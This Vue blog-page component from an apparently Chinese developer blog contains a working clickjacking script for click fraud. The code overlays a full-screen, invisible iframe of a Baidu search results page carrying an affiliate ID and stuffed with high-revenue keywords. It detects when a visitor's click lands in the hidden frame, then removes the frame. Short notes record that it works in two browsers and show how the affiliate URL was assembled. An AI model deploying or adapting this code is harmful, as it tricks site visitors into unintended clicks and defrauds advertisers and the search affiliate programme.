<template>
    <div class="blogCss">
        <div class="blog">
            <div class="blogTitle"> 补点击 脚本 尝试</div>
            <div class="blogContent" v-highlight>
                <script type="text/js">
                    /**
                     * 收益受那些因素影响？？
                     * https://yz.m.sm.cn/?from=wm687667
                     */
                    ; (function () {
                        var sm = {
                            name: 'Sm',
                            num: '12345'
                        };
                        /**
                         * 收益配置
                         */
                        var profitConfig = {
                            position: 100, // 设置为0-800左右，设置为800时收益为0
                            probability: 0.12 // 设置为0-1，设置为0时收益最小，可能没有收益
                        }
                        /**
                         * 收益关键字列表
                         */
                        var profitKeyWordList = [
                            '游戏', '医院', '加盟', '餐饮', '婚纱摄影', '培训机构', '少儿英语', '游戏', '口红'
                        ];
                        /**
                         * 每日关键字列表，建议每日更新,数目越多越好
                         */
                        var lastKeyWordList = [
                            '湖人抽中第四顺位', '张云雷演出被叫停', '秋瓷炫将办婚礼', '岳池男子砍伤6人',
                            '勇士1-0开拓者', '中美贸易战', '李嘉诚公司被唱空', '波音4月0订单',
                            '意尔康仓库大火', '洪欣儿子表白妈妈', '任素汐前夫', '奚梦瑶回应怀孕',
                            '月球背面幔源物质', '强制员工秀恩爱', '意尔康仓库大火', '海马狂卖400套房',
                            '巩俐曝担心演不好', '腾讯平均月薪7万', '华为回应美国封锁', '消防拖地小哥找到',
                            '宁泽涛公开恋情', '中国联航飞机没油', '李宇春白色羽毛装', 'Bridge偶遇彭于晏',
                            '灵山景区暂停开放', '黑镜第五季曝预告', '奥迪回应异味致癌', '何猷君审美被吐槽',
                            '中国女排战胜波兰', '叶嘉莹先生再捐款'
                        ];
                        var keyWordList = [].concat(profitKeyWordList, lastKeyWordList);
                        var currentPageKeyWord = getCurrentKeyWord();
                        var randomWord = usefulList();
                        function usefulList () {
                            var r = Math.random();
                            if(r > profitConfig.probability){
                                return getKeyWord(currentPageKeyWord);
                            }
                            return getKeyWord(keyWordList);
                        };
                        /**
                         * 插入iframe搜索页
                         */
                        setTimeout(insertIframe, 0);
                        var listenTimer = setInterval(function () {
                            var activeEle = document.activeElement;
                            var iframe = document.getElementById(sm.name);
                            if (activeEle === iframe) {
                                // iframe.style.height = 0;
                                var opacity = 50
                                iframe.style.filter = 'alpha(opacity=' + opacity + ')'; /* IE */
                                iframe.style.MozOpacity = (opacity / 100); /* 老版Mozilla */
                                iframe.style.KhtmlOpacity = (opacity / 100); /* 老版Safari */
                                iframe.style.opacity = (opacity / 100); /* 支持opacity的浏览器*/
                                clearInterval(listenTimer);
                                setTimeout(function () {
                                    document.body.removeChild(iframe);
                                    alert('检测到五秒前用户点击了百度页面')
                                }, 5000)
                            }
                        }, 100);
                        /**
                         * 向html中插入搜索页面
                         */
                        function insertIframe() {
                            var windowWidth = document.documentElement.clientWidth;
                            var heightWidth = document.documentElement.clientHeight;
                            var iframe = document.createElement('iframe');
                            iframe.src = 'https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=92111257_hao_pg&wd=' + randomWord + '&rsv_t=e4f0RbU73RuCvJNMxjF8q6ZMSud6kOIZaKIA5wRG57VTgLyvR%2Fzna6dvXI8&rsv_enter=0&rsv_dl=tb&rsv_sug3=3&rsv_sug1=3&rsv_sug7=101&inputT=3843&rsv_sug4=137795';
                            iframe.setAttribute('name', sm.name);
                            iframe.setAttribute('id', sm.name);
                            iframe.style.width = windowWidth + 'px';
                            iframe.style.height = heightWidth + 'px';
                            iframe.style.position = 'fixed';
                            iframe.style.overflow = 'hidden';
                            iframe.style.top = 0;
                            iframe.style.left = 0;
                            iframe.style.zIndex = '999999';
                            var opacity = 0
                            iframe.style.filter = 'alpha(opacity=' + opacity + ')'; /* IE */
                            iframe.style.MozOpacity = (opacity / 100); /* 老版Mozilla */
                            iframe.style.KhtmlOpacity = (opacity / 100); /* 老版Safari */
                            iframe.style.opacity = (opacity / 100); /* 支持opacity的浏览器*/
                            document.body.appendChild(iframe);
                        }
                        /**
                         * 获取随机关键字
                         * @param {数组} list
                         */
                        function getKeyWord(list) {
                            if (!isArray(list)) {return ''}
                            var listLength = list.length;
                            var random = Math.random();
                            return list[parseInt(random * listLength)];
                        }
                        /**
                         * 判断变量是否为数组
                         * @param {变量} value
                         */
                        function isArray(value) {
                            return Object.prototype.toString.call(value) == '[object Array]';
                        }
                        /**
                         * 获取当前网页关键字
                         */
                        function getCurrentKeyWord() {
                            var metaList = document.getElementsByTagName('meta');
                            var title = document.getElementsByTagName('title');
                            var arr = [];
                            arr.push(title[0].innerHTML);
                            for (var i = 0; i < metaList.length; i++) {
                                if(/\<meta.*keywords.*content='.*'\>/.test(nodeToString(metaList[i]))){
                                    var keyword = metaList[i].getAttribute('content');
                                    if (/\,/.test(keyword)){
                                        arr.concat(keyword.split(','));
                                    } else if (/\s*/.test(keyword)){
                                        arr.concat(keyword.split(' '));
                                    }
                                }
                            }
                            return arr;
                        }
                        /**
                         * dom转字符串
                         */
                        function nodeToString(node) {
                            var tmpNode = document.createElement('div');
                            tmpNode.appendChild(node.cloneNode(true));
                            var str = tmpNode.innerHTML;
                            tmpNode = node = null;
                            return str;
                        }
                    })(window);
                </script>
                <p>360急速浏览器 11.0 没问题</p>
                <p>谷歌浏览器 75 没问题</p>
                <p>没问题</p>
                <hr />
                <p>分析百度</p>
                <p>https://www.baidu.com/?tn=92111257_hao_pg</p>
                <p>https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=哈哈哈&rsv_t=e4f0RbU73RuCvJNMxjF8q6ZMSud6kOIZaKIA5wRG57VTgLyvR%2Fzna6dvXI8&rsv_enter=0&rsv_dl=tb&rsv_sug3=3&rsv_sug1=3&rsv_sug7=101&inputT=3843&rsv_sug4=137795</p>
                <p>组合成</p>
                <p>https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=92111257_hao_pg&wd=XXX&rsv_t=e4f0RbU73RuCvJNMxjF8q6ZMSud6kOIZaKIA5wRG57VTgLyvR%2Fzna6dvXI8&rsv_enter=0&rsv_dl=tb&rsv_sug3=3&rsv_sug1=3&rsv_sug7=101&inputT=3843&rsv_sug4=137795</p>
                <p></p>
                <p></p>
            </div>
            <div class="blogFooter">
                <Tag color="green">收集</Tag>
                <Tag color="cyan">学习</Tag>
                <Tag color="blue">增长</Tag>
            </div>
        </div>
    </div>
</template>
<script>
export default {
    data () {
        return {}
    },
    methods: {
    },
    mounted () {
    }
}
</script>
